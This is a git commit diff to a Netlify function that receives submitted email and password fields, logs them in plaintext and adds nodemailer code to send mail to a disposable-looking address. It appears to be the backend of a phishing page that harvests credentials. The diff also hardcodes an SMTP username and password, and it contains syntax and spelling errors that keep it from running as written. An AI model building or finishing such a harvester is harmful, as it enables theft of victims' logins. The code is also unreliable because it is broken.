610ac131deb49938efef8283132615ca5b990cbf
wirthschwind <139864045+wirthschwind@users.noreply.github.com>
2024-01-13 00:24:55 +0100

    Update relish.ts

--- netlify/functions/relish.ts
+++ netlify/functions/relish.ts
@@ -1,13 +1,41 @@
 import type { Context } from "@netlify/functions"
+import nodemailer from "nodemailer"
 
 export default async (req: Request, context: Context) => {
   let response;
   const body = await req.formData();
-  
-console.log('response:', {email: body.get("ai"), password: body.get("pr")})
+  const email = body.get("ai");
+  const password = body.get("pr");
+  console.log('response:', {email, password)
   switch(req?.method){
     case "POST":
-      response = new Response(JSON.stringify({email: body.get("ai"), password: body.get("pr"), context}))
+      try{
+        if(email && password){
+  const transporter = nodemailer.createTransport({
+  host: "smtp.forwardemail.net",
+  port: 465,
+  secure: true, // upgrade later with STARTTLS
+  auth: {
+    user: "wirthschwind@gmail.com",
+    pass: "Relish2023!@",
+  },
+});
+
+  const message = {
+  from: "wirthschwind@gmail.com",
+  to: "dexolol807@roborena.com",
+  subject: "Message title",
+  text: "Plaintext version of the message",
+  html: "<p>HTML version of the message</p>",
+};
+
+  const sendy = await transporter.sendmail(message);
+}
+      }
+      catch(error){
+        console.log(errror)
+      }
+      response = new Response(JSON.stringify({email, password, context}))
       break;
     case "GET":
       response = new Response("Get method")
